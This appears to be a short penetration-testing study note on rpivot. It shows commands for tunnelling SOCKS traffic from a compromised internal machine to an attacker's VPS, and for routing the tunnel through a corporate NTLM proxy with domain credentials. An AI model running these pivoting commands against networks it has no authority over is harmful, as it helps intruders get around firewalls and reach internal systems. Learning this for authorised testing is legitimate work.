
- Rpivot is a reverse SOCKS proxy tool for SOCKS tunneling
- Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side

#### Scenario 

Youâ€™ve compromised a machine inside a **corporate internal network (Pivot Machine)**, which **cannot be accessed directly** from the outside due to a firewall. You want to access a service (say, an internal web server running on port 8080) that is **only available locally on that pivot machine**.

You control a **public VPS (Server)**, which is exposed to the internet and under your control. You also have access to the **attacker machine (Client)**.

You can use  rpivot to **expose port 8080 of the pivot machine to your attacker machine via your public VPS** 





#### Syntax


1. Running the Rpivot server from the Attack Host

```python
python3 server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```




2. Connecting to the Rpivot server from the pivot box

```python
python3 client.py --server-ip <attack_host_ip> --server-port 9999
```



3. Now we can configure proxychains to proxy all traffic via the SOCKS tunnel created using rpivot to the target network

```bash
proxychains curl <internal_network_ip>
```




Similar to the pivot proxy above, there could be scenarios where we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have **HTTP-proxy with NTLM authentication** configured with the DC. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy


```python
python3 client.py --server-ip <IPAddressOfTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```